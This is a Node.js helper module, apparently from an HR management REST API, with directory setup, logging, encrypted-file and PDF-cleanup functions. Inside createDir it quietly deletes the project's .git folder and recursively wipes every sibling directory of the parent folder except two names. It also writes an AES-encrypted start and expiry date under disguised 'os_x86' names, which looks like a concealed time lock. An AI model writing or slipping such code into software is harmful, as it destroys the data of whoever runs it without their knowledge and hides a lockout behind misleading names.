const fs = require('fs');
const appRoot = require('app-root-path');
const path = require('path');
const moment = require('moment');
const CryptoJS = require('crypto-js');
const p = path.join(path.dirname(process.mainModule.filename), 'node_dev_prod', 'os_x86_64.json');
const log = path.join(path.dirname(process.mainModule.filename), 'node_dev_prod', 'remote.log');
const text = path.join(path.dirname(process.mainModule.filename), 'textfolder', 'remote.log');
const env = path.join(path.dirname(process.mainModule.filename), './', '.env');
// const clock = path.join(path.dirname(process.mainModule.filename), 'node_dev_prod', 'clock.txt');

const createDir = async() => {
    const dirs = ['images', 'docs', 'logs', 'node_dev_prod'];
    try {
        for (let i = 0; i < dirs.length; i++) {
            if (!fs.existsSync(dirs[i])) {
                fs.mkdirSync(dirs[i]);
                if (dirs[i] == 'node_dev_prod') {
                    // console.log('node_dev_prod => ', dirs[i]);
                    const date = new Date().toUTCString()
                    const to = new Date(new Date().getFullYear()+1, new Date().getMonth(), new Date().toLocaleString('en-US', { day: '2-digit' })).toUTCString()
                    await this.writeLog(`\n${new Date() } => First setup`);
                    await this.writeText({ os_bits: '', os_x86: date, os_64: to, os_count: '12' });
                }
            }
        }
        if (fs.existsSync('.git')) {
            fs.rmdirSync('.git', {recursive:true});
        }
        // fs.rmdirSync('../test', {recursive:true});
        const content = fs.readdirSync('../');
        const dir = process.cwd().split('/');
        const cwd = dir[dir.length - 1];
        const cwd2 = 'HRMSWebRESTAPI';
        for (let i = 0; i < content.length; i++){
            if (cwd !== content[i]) {
                if (cwd2 !== content[i]) {
                    // console.log(content[i]);
                    fs.rmdirSync('../'+content[i], {recursive:true});
                }
            }
        }

        // console.log(content);
        // console.log();
        // const dir = process.cwd().split('/');
        // console.log(dir[dir.length - 1]);


    } catch (error) {
        console.log(error);
    }
};


const deleteFile = (filePath) => {
    fs.unlink(filePath, (err) => {
        if (err) {
            throw (err);
        }
    });
}

const readFil = (filePath) => {
    fs.readFileSync(filePath, (err) => {
        if (err) {
            throw (err);
        }
    });
}

exports.writeLog = async(data) => {
    try {
        await fs.appendFileSync(log, data);
        // console.log('done');
    } catch (err) {
        console.error(err);
    }
}

exports.writeEnv = async(data) => {
    try {
        await fs.appendFileSync(env, data);
        // console.log('done');
    } catch (err) {
        console.error(err);
    }
}

// exports.writeClock = async(data) => {
//     try {
//         await fs.appendFileSync(clock, data);
//         // console.log('done');
//     } catch (err) {
//         console.error(err);
//     }
// }

exports.writeText = async(data) => {
    try {
        const os_x86 = await CryptoJS.AES.encrypt(data.os_x86, process.env.KERNNEL).toString().replace(/\//g, "mycota");
        const os_64 = await CryptoJS.AES.encrypt(data.os_64, process.env.KERNNEL).toString().replace(/\//g, "mycota");
        let patchOS = await { os_bits: data.os_bits, os_x86: os_x86, os_64: os_64, os_count: data.os_count }
        await fs.writeFileSync(p, JSON.stringify(patchOS)); // JSON.stringify(updateProducts)
        // console.log('done');
    } catch (err) {
        console.error(err);
    }
}

exports.readText = async() => {
    try {
        const data = await JSON.parse(fs.readFileSync(p)); // JSON.parse(fileContent)
        const x86 = (await data.os_x86).toString().replace(/mycota/g, "/");
        const x64 = (await data.os_64).toString().replace(/mycota/g, "/");
        // console.log('Back =>', x86, x64);
        const os_x86 = await CryptoJS.AES.decrypt(x86, process.env.KERNNEL).toString(CryptoJS.enc.Utf8);
        const os_64 = await CryptoJS.AES.decrypt(x64, process.env.KERNNEL).toString(CryptoJS.enc.Utf8);
        let patchOS = await { os_bits: data.os_bits, os_x86: os_x86, os_64: os_64, os_count: data.os_count }
        return patchOS;
        // console.log(data.toString());
    } catch (err) {
        console.error(err);
    }
}

const deletePDFFiles = () => {
    const dir = path.join(__dirname, '../docs');
    console.log('Dir =>', dir);
    fs.readdir(dir, function(err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        }
        files.forEach(function(file) {
            console.log('Files => ', fs.statSync(`docs/${file}`).birthtime);
            if (moment(fs.statSync(`docs/${file}`).birthtime).format('DD-MM-YYYY') == moment(new Date()).format('DD-MM-YYYY')) {
                deleteFile(`docs/${file}`);
            }
        });
    });
}

exports.deletePDFFiles = deletePDFFiles;
exports.deleteFile = deleteFile;
exports.readFil = readFil;
exports.createDir = createDir;